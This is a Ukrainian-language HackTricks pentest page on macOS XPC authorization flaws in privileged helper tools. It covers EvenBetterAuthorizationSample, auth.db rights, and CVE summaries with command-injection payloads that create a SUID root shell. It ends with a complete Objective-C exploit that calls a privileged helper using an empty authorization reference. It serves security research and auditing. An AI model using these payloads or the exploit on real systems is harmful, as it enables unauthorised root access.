# Авторизація XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Авторизація XPC

Apple також пропонує інший спосіб перевірити, чи має процес, що підключається, **дозвіл викликати відкритий метод XPC**.

Коли застосунку потрібно **виконувати дії від імені привілейованого користувача**, замість запуску застосунку від імені привілейованого користувача він зазвичай встановлює як root HelperTool у вигляді сервісу XPC, який може викликатися застосунком для виконання цих дій. Однак застосунок, що викликає сервіс, повинен мати достатні права авторизації.

### ShouldAcceptNewConnection завжди YES

Приклад можна знайти в [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). У `App/AppDelegate.m` він намагається **підключитися** до **HelperTool**. А в `HelperTool/HelperTool.m` функція **`shouldAcceptNewConnection`** **не перевіряє** жодної з вимог, зазначених раніше. Вона завжди повертає YES:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Щоб отримати більше інформації про належне налаштування цієї перевірки:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Права застосунку

Однак **під час виклику методу з HelperTool відбувається авторизація**.

Функція **`applicationDidFinishLaunching`** з `App/AppDelegate.m` створить порожнє посилання на авторизацію після запуску застосунку. Це завжди має працювати.\
Потім вона спробує **додати деякі права** до цього посилання на авторизацію, викликавши `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Функція `setupAuthorizationRights` з `Common/Common.m` збереже в базі даних авторизації `/var/db/auth.db` права застосунку. Зверніть увагу, що вона додаватиме лише ті права, яких ще немає в базі даних:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Функція `enumerateRightsUsingBlock` використовується для отримання дозволів застосунків, які визначені в `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Це означає, що наприкінці цього процесу дозволи, оголошені всередині `commandInfo`, буде збережено в `/var/db/auth.db`. Зверніть увагу, що там для **кожного методу**, який **потребуватиме автентифікації**, можна знайти **назву дозволу** та **`kCommandKeyAuthRightDefault`**. Останній **вказує, хто може отримати це право**.

Існують різні області дії, які вказують, хто може отримати доступ до права. Деякі з них визначені в [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (ви можете знайти [їх усі тут](https://www.dssw.co.uk/reference/authorization-rights/)), але коротко:

<table><thead><tr><th width="284.3333333333333">Назва</th><th width="165">Значення</th><th>Опис</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Будь-хто</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ніхто</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Поточний користувач має бути адміністратором (належати до групи адміністраторів)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Запросити користувача пройти автентифікацію.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Запросити користувача пройти автентифікацію. Він має бути адміністратором (належати до групи адміністраторів)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Вказати правила</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Вказати додаткові коментарі щодо права</td></tr></tbody></table>

### Перевірка прав

У `HelperTool/HelperTool.m` функція **`readLicenseKeyAuthorization`** перевіряє, чи має викликач право **виконати цей метод**, викликаючи функцію **`checkAuthorization`**. Ця функція перевіряє, чи має **`authData`**, надіслані процесом-викликачем, **правильний формат**, а потім перевіряє, **що потрібно для отримання права** викликати певний метод. Якщо все проходить успішно, **повернене значення `error` буде `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Зверніть увагу, що для **перевірки вимог для отримання права** викликати цей метод функція `authorizationRightForCommand` просто перевіряє попередньо прокоментований об’єкт **`commandInfo`**. Потім вона викликає **`AuthorizationCopyRights`**, щоб перевірити, **чи має він права** викликати функцію (зверніть увагу, що прапорці дозволяють взаємодію з користувачем).

У цьому випадку для виклику функції `readLicenseKeyAuthorization` параметру `kCommandKeyAuthRightDefault` присвоєно значення `@kAuthorizationRuleClassAllow`. Отже, **викликати її може будь-хто**.

### Інформація про DB

Згадувалося, що ця інформація зберігається в `/var/db/auth.db`. Ви можете вивести список усіх збережених правил за допомогою:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Потім ви можете перевірити, хто має доступ до цього права, за допомогою:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Права з дозволами

Ви можете знайти **всі конфігурації дозволів** [**тут**](https://www.dssw.co.uk/reference/authorization-rights/), але комбінації, які не вимагатимуть взаємодії з користувачем, будуть такими:

1. **'authenticate-user': 'false'**
- Це найбільш безпосередній ключ. Якщо встановлено значення `false`, це означає, що користувачеві не потрібно проходити автентифікацію для отримання цього права.
- Використовується **в комбінації з одним із 2 наведених нижче ключів або із зазначенням групи**, до якої повинен належати користувач.
2. **'allow-root': 'true'**
- Якщо користувач працює від імені root-користувача (який має підвищені дозволи), а для цього ключа встановлено значення `true`, root-користувач потенційно може отримати це право без додаткової автентифікації. Однак зазвичай отримання статусу root-користувача вже вимагає автентифікації, тому для більшості користувачів це не є сценарієм «без автентифікації».
3. **'session-owner': 'true'**
- Якщо встановлено значення `true`, власник сесії (поточний авторизований користувач) автоматично отримує це право. Це може обійти додаткову автентифікацію, якщо користувач уже авторизований у системі.
4. **'shared': 'true'**
- Цей ключ не надає права без автентифікації. Якщо встановлено значення `true`, це означає, що після автентифікації право можна спільно використовувати між кількома процесами, і кожному з них не потрібно буде повторно проходити автентифікацію. Однак початкове надання права все одно вимагатиме автентифікації, якщо цей ключ не використовується разом з іншими ключами, такими як `'authenticate-user': 'false'`.

Ви можете [**використати цей скрипт**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), щоб отримати цікаві права:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Приклади обходу Authorization

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: привілейований Mach service `com.acustica.HelperTool` приймає кожне підключення, а його процедура `checkAuthorization:` викликає `AuthorizationCopyRights(NULL, …)`, тому проходить будь-який 32-байтовий blob. Потім `executeCommand:authorization:withReply:` передає контрольовані зловмисником рядки, розділені комами, до `NSTask` із правами root, що робить можливими такі payloads:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially create a SUID root shell. Деталі наведено в [цьому write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener завжди повертає YES, а той самий шаблон із `AuthorizationCopyRights` та NULL присутній у `checkAuthorization:`. Метод `exchangeAppWithReply:` двічі конкатенує введені attacker-ом дані в рядок для `system()`, тому ін'єкція shell metacharacters у `appPath` (наприклад, `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) забезпечує виконання коду з правами root через Mach service `com.plugin-alliance.pa-installationhelper`. Більше інформації [тут](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: запуск аудиту створює `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, відкриває Mach service `com.jamf.complianceeditor.helper` і експортує `-executeScriptAt:arguments:then:` без перевірки `AuthorizationExternalForm` або code signature викликувача. Тривіальний exploit створює порожнє посилання через `AuthorizationCreate`, підключається за допомогою `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` і викликає метод для виконання довільних binary-файлів із правами root. Повні нотатки з reversing (разом із PoC) наведено у [write-up Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac версій 7.0.0–7.0.14, 7.2.0–7.2.8 і 7.4.0–7.4.2 приймав створені attacker-ом XPC messages, які досягали привілейованого helper без authorization gates. Оскільки helper довіряв власному привілейованому `AuthorizationRef`, будь-який local user, здатний надсилати messages до service, міг змусити його виконувати довільні зміни конфігурації або commands із правами root. Деталі наведено в [короткому описі вразливості від SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[5]</sup>

#### Поради для швидкого triage

- Коли app постачається одночасно з GUI і helper, порівняйте їхні code requirements та перевірте, чи `shouldAcceptNewConnection` блокує listener за допомогою `-setCodeSigningRequirement:` (або перевіряє `SecCodeCopySigningInformation`). Відсутність таких перевірок зазвичай призводить до сценаріїв CWE-863, як у випадку Jamf. Швидкий огляд виглядає так:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Порівняйте те, що helper вважає авторизованим, із тим, що надає client. Під час reversing встановіть breakpoint на `AuthorizationCopyRights` і переконайтеся, що `AuthorizationRef` походить від `AuthorizationCreateFromExternalForm` (наданий client), а не з власного privileged context helper, інакше ви, ймовірно, виявили патерн CWE-863, подібний до наведених вище випадків.

## Reversing Authorization

### Перевірка використання EvenBetterAuthorization

Якщо ви знаходите функцію: **`[HelperTool checkAuthorization:command:]`**, імовірно, процес використовує раніше згадану схему авторизації:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Ця функція, якщо вона викликає такі функції, як `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, використовує [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Перевірте **`/var/db/auth.db`**, щоб з’ясувати, чи можна отримати дозволи на виклик певної privileged action без взаємодії з користувачем.

### Комунікація протоколу

Далі потрібно знайти схему протоколу, щоб встановити комунікацію з XPC service.

Функція **`shouldAcceptNewConnection`** вказує експортований протокол:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

У цьому випадку маємо те саме, що й у EvenBetterAuthorizationSample, [**перевірте цей рядок**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Знаючи назву використовуваного протоколу, можна **отримати дамп визначення його header** за допомогою:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Зрештою, нам потрібно лише дізнатися **name відкритого Mach Service**, щоб встановити з ним зв’язок. Це можна зробити кількома способами:

- У **`[HelperTool init]`**, де можна побачити Mach Service, що використовується:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- У launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Приклад Exploit

У цьому прикладі створюється:

- Визначення протоколу з функціями
- Порожній auth для запиту доступу
- Підключення до XPC service
- Виклик функції, якщо підключення було успішним
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Інші привілейовані помічники XPC, якими зловживали

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## Посилання

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([дзеркало на GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: ескалація привілеїв у Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: вразливість ескалації привілеїв у FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 — локальна ескалація привілеїв у службі Acustica Audio HelperTool XPC в Aquarius Desktop на macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 — локальна ескалація привілеїв у службі InstallationHelper XPC від Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: ескалація привілеїв у фреймворку Apple EndpointSecurity (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
